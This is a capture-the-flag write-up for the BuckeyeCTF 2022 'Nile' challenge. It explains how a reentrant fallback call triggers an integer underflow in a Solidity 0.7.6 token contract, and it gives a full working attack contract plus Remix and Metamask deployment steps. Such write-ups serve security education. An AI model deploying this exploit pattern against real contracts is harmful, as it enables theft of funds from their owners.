# Nile - BuckeyeCTF 2022
## Introduction
Nile is a beginner misc. task in the 2022 BuckeyeCTF. The project description is as follows:

I wrote my first smart contract on Ethereum, deployed onto the Görli testnet, you have got to check it out! To celebrate it's launch, I'm giving away free tokens, you just have to redeem your balance. Connect to the server to see the contract address.

`nc -v nile.chall.pwnoh.io 13379`

## Process
Running the netcat gives the following:
```
Hello! The contract is running at 0x7217bd381C35dd9E1B8Fcbd74eaBac4847d936af on the Goerli Testnet.
Here is your token id: 0x0aff2a3e450768b95c9e99196842a636
Are you ready to receive your flag? (y/n)
```
The given token id is different every time the netcat is run. The given address for the contract links to a page on the Ethernet Goerli Testnet Network [here](https://goerli.etherscan.io/address/0x7217bd381C35dd9E1B8Fcbd74eaBac4847d936af). This links to a smart contract, Nile, written in [Solidity](https://docs.soliditylang.org/en/v0.8.17/#):
```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;


contract Nile {
    mapping(address => uint256) balance;
    mapping(address => uint256) redeemable;
    mapping(address => bool) accounts;

    event GetFlag(bytes32);
    event Redeem(address, uint256);
    event Created(address, uint256);
    
    function redeem(uint amount) public {
        require(accounts[msg.sender]);
        require(redeemable[msg.sender] > amount);

        (bool status, ) = msg.sender.call("");

        if (!status) {
            revert();
        }

        redeemable[msg.sender] -= amount;

        balance[msg.sender] += amount;

        emit Redeem(msg.sender, amount);
    }

    function createAccount() public {
        balance[msg.sender] = 0;
        redeemable[msg.sender] = 100;
        accounts[msg.sender] = true;

        emit Created(msg.sender, 100);
    }

    function createEmptyAccount() public {
        // empty account starts with 0 balance
        balance[msg.sender] = 0;
        accounts[msg.sender] = true;
    }

    function deleteAccount() public {
        require(accounts[msg.sender]);
        balance[msg.sender] = 0;
        redeemable[msg.sender] = 0;
        accounts[msg.sender] = false;
    }

    function getFlag(bytes32 token) public {
        require(accounts[msg.sender]);
        require(balance[msg.sender] > 1000);

        emit GetFlag(token);
    }
}
```
I chose to run the smart contracts on [Remix](https://remix.ethereum.org). Note: make sure to match the compiler version to the version called with `pragma solidity ^x.y.z;` at the top of the file. 

Reading through the contract, we can see that we want to call the function `getFlag()`. In order to call `getFlag()` we need `accounts[msg.sender] == true` and `balance[msg.sender] > 1000`.  `redeem(amount)` can increase `balance[msg.sender]`, however, the amount we can redeem total must be smaller than `redeemable[msg.sender]`, which is set to 100 every time `createAccount()` is called, but we need 1000 tokens. 

The solution here is to cause an **integer underflow** in `redeemable[msg.sender]` so that we can redeem an amount greater than 99 due to the underflow. This works because the Solidity version is 0.7.6 and in solidity versions before 0.8.0, math overflows do not revert by default ([found here](https://solidity-by-example.org/hacks/overflow/)).

### Integer Underflow
In order to cause integer underflow, we will utilize Solidity's [**fallback function**](https://docs.soliditylang.org/en/v0.8.12/contracts.html#fallback-function). `msg.sender.call("")` calls the fallback function ([found here](https://ethereum.stackexchange.com/questions/42521/what-does-msg-sender-call-do-in-solidity)) which is called in the `redeem()` function. `msg.sender` points to the person or contract who is currently connecting to the contract ([found here](https://stackoverflow.com/questions/48562483/solidity-basics-what-msg-sender-stands-for)). So we can write another contract which calls the Nile contract's `redeem()` function which would then call the fallback function of the contract we write. 

In the fallback function itself, we want to call `deleteAccount()` and then `createEmptyAccount()`. `deleteAccount()` sets `redeemable` to 0, and `createEmptyAccount()`, unlike `createAccount()`, does not initialize `redeemable` to anything. So, when `redeemable[msg.sender] -= amount;` is called, we would subtract some positive value from 0, resulting in integer underflow. We then need to write a couple other functions to call `redeem()` and `getFlag()`. 
```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
import "./Nile.sol";

contract Thing {
    Nile nile;
    
    constructor() {
        nile = Nile(0x7217bd381C35dd9E1B8Fcbd74eaBac4847d936af);
    }
    
    function underflow() public {
        (bool result, ) = address(nile).call(abi.encodeWithSignature("redeem(uint256)",99));
        require(result, "Call has failed");
    }

    function flag() public {
        (bool result, ) = address(nile).call(abi.encodeWithSignature("getFlag(bytes32)",0x8f9154156d73b0fcda140cb2b7b6ddf900000000000000000000000000000000));
        require(result, "Call has failed");
    }

    function account() public {
        (bool result, ) = address(nile).call(abi.encodeWithSignature("createAccount()",""));
        require(result, "Call has failed");
    }

    function bigRedeem() public {
        (bool result, ) = address(nile).call(abi.encodeWithSignature("redeem(uint256)",9999));
        require(result, "Call has failed");
    }

    receive() external payable {
        (bool result, ) = address(nile).call(abi.encodeWithSignature("deleteAccount()",""));
        require(result, "Call has failed");
        (bool result2, ) = address(nile).call(abi.encodeWithSignature("createEmptyAccount()",""));
        require(result2, "Call has failed");
    }
}
```
Details about the code I used can be found in the Code section.
The order of the functions to be called is as follows:

0. The constructor calls the address of the Nile contract that is on the blockchain network, which should be done when the smart contract is deployed.
1. `account()` to create an account. 
2. `underflow()` calls `redeem(99)` which will call the fallback function. The fallback function is `receive() external payable` which calls `deleteAccount()` and `createEmptyAccount()`. 
3. `bigRedeem()` is called after the underflow, redeeming 9999 tokens. 
4. `flag()` which calls `getFlag()` with the token given from the netcat. The token has to be padded right to reach 32 bytes since `getFlag()` only accepts `bytes32`. 

After calling `getFlag()` with the token given by the netcat, return to the terminal, type `y`, and get the flag. 

### How to Run This (Remix & Metamask)
1. Set up a crypto wallet (I used Metamask plugin). 
2. Use a Goerli faucet ([here](https://goerlifaucet.com) or [here](https://goerli-faucet.pk910.de)) to give yourself some ~~fake~~ Eth.
3. Import contract Thing. Compile it. 
4. To test the code on VM servers:  
	1. Import the Nile smart contract. 
	2. Deploy the Nile smart contract to a VM server and copy its local address (which can be found under "Deployed Contracts"):
	![Copy Local Address.png](https://github.com/Sinkasha/buckeyeCTF-writeups/blob/main/Copy%20Local%20Address.png)
	3. Paste the local address into the constructor in contract Thing. 
	4. Deploy Thing, run the functions. Check that each function call on Thing emits an event in logs (more on this in the Code section) and that each function call has a green checkmark, as shown below. 
	![Remix Workspace 1.png](https://github.com/Sinkasha/buckeyeCTF2022-writeups/blob/main/Remix%20Workspace%201.png)
	5. Make sure to change the address back to the actual address instead of the local address when running it on the Goerli test network. 
5. Run the netcat to get the token id and paste it into contract Thing.
6. Deploy Thing to Injected Provider - Metamask. 
7. Run the functions in the order given above, making sure to confirm the transaction on the crypto wallet and wait for the green checkmark by the function before running the next function. If everything is running correctly, the transactions should show up on the Etherscan blockchain network. You will need to spend some of the ~~fake~~ eth. 
![Remix Workspace with Metamask.png](https://github.com/Sinkasha/buckeyeCTF2022-writeups/blob/main/Remix%20Workspace%20with%20Metamask.png) ![Remix Workspace after Thing.flag().png](https://github.com/Sinkasha/buckeyeCTF2022-writeups/blob/main/Remix%20Workspace%20after%20Thing.flag().png)
*Screenshots of my workspace. Top is the Metamask plugin + Remix workspace. Bottom is after running all four functions.* 

After running all four functions, they should show up on the Etherscan network when pasting in the memory address of the deployed Thing contract in the search bar. 
Address: 0xf311CC7d5c950d5DF3664aBb1a53AB7cfd9D11F3
![Etherscan Screenshot.png](https://github.com/Sinkasha/buckeyeCTF2022-writeups/blob/main/Etherscan%20Screenshot.png)
8. Go back to the console and type `y` to get the flag. 
![Nile Console Output.png](https://github.com/Sinkasha/buckeyeCTF2022-writeups/blob/main/Nile%20Console%20Output.png)

## Code
This section is dedicated to Solidity / Remix things.

Importing the contract and then calling the address in the constructor seemed to work better than other options such as:
```Solidity
address nile = 0x7217bd381C35dd9E1B8Fcbd74eaBac4847d936af;
nile.call(abi.encodeWithSignature("function()",""));
```
or creating a Nile object:
```Solidity
Nile nile = Nile(0x7217bd381C35dd9E1B8Fcbd74eaBac4847d936af)
nile.call(abi.encodeWithSignature("function()",""));
```

Method calls from a different contract only worked for me with the following format: 
```Solidity
(bool result, ) = address(nile).call(abi.encodeWithSignature("createAccount()",""));
require(result, "Call has failed");
(bool result2, ) = address(nile).call(abi.encodeWithSignature("redeem(uint256)",9999));
require(result2, "Call has failed");
```
Calling it in any other way gave me an out of gas but Contract Execution Completed error on the Etherscan blockchain network. Despite it saying that Contract Execution Completed, this did not work. Format found [here](https://ethereum.stackexchange.com/questions/84839/status-is-successful-but-got-internal-transaction-out-of-gas). `abi.encodeWithSignature()` found [here](https://ethereum.stackexchange.com/questions/9733/calling-function-from-deployed-contract). There should be no spaces between the parameters and the parameters should use their full names (`uint256` instead of just `uint`)([found here](https://ethereum.stackexchange.com/questions/67572/abi-encodewithsignature-did-not-work)). 

When running this smart contract on Remix, ensure that the methods in contract Nile are being called from contract Thing by checking the logs in the transaction details. Some of the functions in Nile `emit` events which will be output to the logs. Use this to ensure that the contract is actually calling another contract's function. 
![Example of Working Log.png](https://github.com/Sinkasha/buckeyeCTF-writeups/blob/main/Example%20of%20Working%20Log.png)
*A `Thing.account()` call which emits an event for creating an account.*
